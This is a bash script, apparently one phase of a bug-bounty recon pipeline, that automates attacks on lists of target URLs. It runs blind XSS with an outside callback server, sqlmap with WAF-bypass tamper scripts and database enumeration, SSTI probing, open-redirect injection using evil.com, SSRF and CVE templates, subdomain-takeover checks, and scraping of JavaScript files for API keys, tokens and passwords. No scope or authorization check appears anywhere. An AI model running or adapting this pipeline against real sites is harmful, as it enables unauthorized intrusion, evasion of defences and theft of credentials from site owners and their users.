#!/bin/bash
# PHASE 3: VULNERABILITY SCANNING (XSS, SQLi, SSTI, CORS, Redirect, SSRF)
# Calculus-gated: Only runs on HIGH-VALUE params
# Input: high-value-params.txt, live-urls.txt, js-files.txt
# Output: vulns.txt, xss.txt, sqli.txt, etc.

set -euo pipefail

PARAMS_FILE="${1}"
LIVE_URLS_FILE="${2}"
JS_FILES_FILE="${3}"
OUT_DIR="${OUT_DIR:-$(pwd)/recon-$(date +%Y%m%d-%H%M)}"
mkdir -p "$OUT_DIR"

ASSUMPTIONS_LOG="$OUT_DIR/assumptions.log"
log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$ASSUMPTIONS_LOG"; }

log "=== PHASE 3: VULN SCANNING (Calculus-gated) ==="
log "Params: $PARAMS_FILE"
log "Live URLs: $LIVE_URLS_FILE"
log "JS Files: $JS_FILES_FILE"

# ===== CALCULUS CHECK =====
if [ ! -f "$PARAMS_FILE" ] || [ ! -s "$PARAMS_FILE" ]; then
    log "WARNING: No params file or empty. Skipping param-based scans."
    PARAMS_FILE="$LIVE_URLS_FILE"
fi

PARAM_COUNT=$(wc -l < "$PARAMS_FILE" 2>/dev/null || echo 0)
if [ "$PARAM_COUNT" -gt 2000 ]; then
    log "WARNING: $PARAM_COUNT params exceeds threshold. Sampling top 2000 by Calculus..."
    head -2000 "$PARAMS_FILE" > "$OUT_DIR/params-sampled.txt"
    PARAMS_FILE="$OUT_DIR/params-sampled.txt"
fi

# ===== XSS SCANNING =====
if command -v dalfox &> /dev/null; then
    log "Running XSS scan (Gxss + Dalfox)..."
    cat "$PARAMS_FILE" | Gxss -c 100 -p XssReflected 2>/dev/null | \
        dalfox pipe -b "${XSS_SERVER:-https://xss.predator.recon}" \
        -w 100 -o "$OUT_DIR/xss-reflected.txt" 2>&1 | tee -a "$ASSUMPTIONS_LOG"
    
    # Blind XSS
    if [ -n "${XSS_SERVER:-}" ]; then
        log "Running Blind XSS..."
        cat "$PARAMS_FILE" | dalfox pipe -b "$XSS_SERVER" -blind \
            -o "$OUT_DIR/xss-blind.txt" 2>&1 | tee -a "$ASSUMPTIONS_LOG"
    fi
else
    log "dalfox not found, skipping XSS"
fi

# ===== SQL INJECTION =====
if command -v sqlmap &> /dev/null; then
    log "Running SQLi scan..."
    
    # Quick error-based
    log "  [1/3] Error-based (fast)..."
    sqlmap -m "$PARAMS_FILE" --batch --random-agent --level 1 --risk 1 \
        --tamper=space2comment --dbs --threads 5 \
        --output-dir="$OUT_DIR/sqlmap-error" 2>&1 | tee -a "$ASSUMPTIONS_LOG"
    
    # WAF bypass for high-value params
    if [ -f "$OUT_DIR/high-value-params.txt" ] && [ -s "$OUT_DIR/high-value-params.txt" ]; then
        log "  [2/3] WAF bypass on high-value params..."
        sqlmap -m "$OUT_DIR/high-value-params.txt" --batch --random-agent \
            --level 3 --risk 2 \
            --tamper=space2comment,between,randomcase,charencode \
            --technique=BEUSTQ --dbs --threads 3 \
            --output-dir="$OUT_DIR/sqlmap-waf" 2>&1 | tee -a "$ASSUMPTIONS_LOG"
    fi
    
    # Time-based blind (targeted)
    if [ -n "${SQLMAP_DEEP:-}" ]; then
        log "  [3/3] Deep time-based (SQLMAP_DEEP set)..."
        sqlmap -m "$OUT_DIR/high-value-params.txt" --batch --random-agent \
            --level 5 --risk 3 --technique=T --time-sec=5 \
            --output-dir="$OUT_DIR/sqlmap-deep" 2>&1 | tee -a "$ASSUMPTIONS_LOG"
    fi
else
    log "sqlmap not found, skipping SQLi"
fi

# ===== SSTI =====
if command -v tplmap &> /dev/null; then
    log "Running SSTI scan..."
    cat "$PARAMS_FILE" | while read url; do
        tplmap -u "$url" --batch 2>/dev/null | anew "$OUT_DIR/ssti.txt"
    done
else
    log "tplmap not found, skipping SSTI"
fi

# ===== CORS MISCONFIG =====
if command -v CORS-Scanner &> /dev/null; then
    log "Running CORS scan..."
    cat "$LIVE_URLS_FILE" | CORS-Scanner > "$OUT_DIR/cors.txt" 2>&1
    # Verify manually: check for Origin reflection + Credentials: true
    grep -i "access-control-allow-credentials.*true" "$OUT_DIR/cors.txt" | \
        grep -i "access-control-allow-origin.*evil\|access-control-allow-origin.*\*" | \
        anew "$OUT_DIR/cors-vuln.txt"
else
    log "CORS-Scanner not found, skipping CORS"
fi

# ===== OPEN REDIRECT =====
log "Checking open redirects..."
cat "$LIVE_URLS_FILE" | grep -E "(url|redirect|next|return|goto|returnTo|return_to|continue|dest|destination|target)=http" | \
    qsreplace "https://evil.com" | \
    while read url; do
        if curl -s -L "$url" -I 2>/dev/null | grep -qi "evil.com"; then
            echo "$url" | anew "$OUT_DIR/open-redirect.txt"
        fi
    done

# ===== SSRF (Nuclei) =====
if command -v nuclei &> /dev/null; then
    log "Running SSRF scan (nuclei)..."
    nuclei -l "$LIVE_URLS_FILE" -t ssrf/ -rate-limit 50 -silent -o "$OUT_DIR/ssrf.txt"
fi

# ===== JS ANALYSIS =====
if [ -f "$JS_FILES_FILE" ] && [ -s "$JS_FILES_FILE" ]; then
    log "Analyzing JS files..."
    
    # jscracker
    if command -v jscracker &> /dev/null; then
        log "  jscracker..."
        cat "$JS_FILES_FILE" | jscracker | anew "$OUT_DIR/js-secrets.txt"
    fi
    
    # Nuclei on JS
    if command -v nuclei &> /dev/null; then
        log "  nuclei on JS..."
        nuclei -l "$JS_FILES_FILE" -t exposures/ -t fuzzing/ -rate-limit 50 -silent -o "$OUT_DIR/js-nuclei.txt"
    fi
    
    # Secret patterns (manual grep)
    log "  secret pattern grep..."
    cat "$JS_FILES_FILE" | while read js; do
        curl -s "$js" | grep -iE "(api[_-]?key|secret|token|password|private[_-]?key|aws[_-]?key|jwt|bearer)" | \
            sed "s/^/$js: /" | anew "$OUT_DIR/js-secrets-grep.txt"
    done
fi

# ===== SUBDOMAIN TAKEOVER =====
if command -v subzy &> /dev/null && [ -f "$LIVE_URLS_FILE" ]; then
    log "Checking subdomain takeover..."
    subzy run --targets "$LIVE_URLS_FILE" | anew "$OUT_DIR/takeover.txt"
fi

# ===== NUCLEI TARGETED =====
if command -v nuclei &> /dev/null; then
    log "Running targeted nuclei scans..."
    nuclei -l "$LIVE_URLS_FILE" \
        -t vulnerabilities/ -t cves/ -t exposures/ -t misconfiguration/ \
        -t fuzzing-templates/ -t ssl/ \
        -rate-limit 100 -severity critical,high,medium \
        -silent -o "$OUT_DIR/nuclei-targeted.txt"
fi

# ===== CONSOLIDATE VULNS =====
log "Consolidating verified vulnerabilities..."
cat "$OUT_DIR"/*.txt 2>/dev/null | grep -v "^$" | sort -u > "$OUT_DIR/vulns-all.txt"

# ===== BLIND SPOT CHECK =====
log "Blind Spot Scanner..."
# What did tools miss?
# - Business logic (manual)
# - Race conditions (manual)
# - AuthZ bypass (manual)
# - Chain vulnerabilities (manual)
cat > "$OUT_DIR/blind-spots.md" << 'EOF'
# Blind Spots - Manual Review Required
- Business logic flaws (price manipulation, coupon abuse, workflow bypass)
- Race conditions (concurrent withdrawals, double-spend, limit bypass)
- Authorization bypass (IDOR, horizontal/vertical privilege escalation)
- Chain vulnerabilities (multi-step exploits)
- Off-chain → on-chain bridges (oracle manipulation, signature replay)
- Upgradeability / proxy storage collisions
- Governance attacks (flash loans, vote manipulation)
EOF

log "=== PHASE 3 COMPLETE ==="
log "Outputs:"
log "  $OUT_DIR/xss-*.txt (XSS results)"
log "  $OUT_DIR/sqlmap-*/ (SQLi results)"
log "  $OUT_DIR/ssti.txt (SSTI)"
log "  $OUT_DIR/cors*.txt (CORS)"
log "  $OUT_DIR/open-redirect.txt (Redirects)"
log "  $OUT_DIR/ssrf.txt (SSRF)"
log "  $OUT_DIR/js-*.txt (JS secrets)"
log "  $OUT_DIR/takeover.txt (Takeover)"
log "  $OUT_DIR/nuclei-targeted.txt (Nuclei)"
log "  $OUT_DIR/vulns-all.txt (Consolidated)"
log "  $OUT_DIR/blind-spots.md (Manual review)"

# Export for next phase
echo "$OUT_DIR/vulns-all.txt" > "$OUT_DIR/.phase3-vulns"